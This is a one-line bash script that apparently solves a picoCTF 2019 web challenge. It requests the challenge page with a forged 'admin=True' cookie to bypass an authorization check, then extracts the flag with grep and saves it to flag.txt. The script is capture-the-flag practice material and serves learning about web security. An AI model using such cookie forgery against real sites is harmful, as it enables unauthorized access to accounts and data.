#!/bin/bash

curl -s --cookie "admin=True" https://2019shell1.picoctf.com/problem/12284/flag | grep -oE "picoCTF{.*}" | tee flag.txt
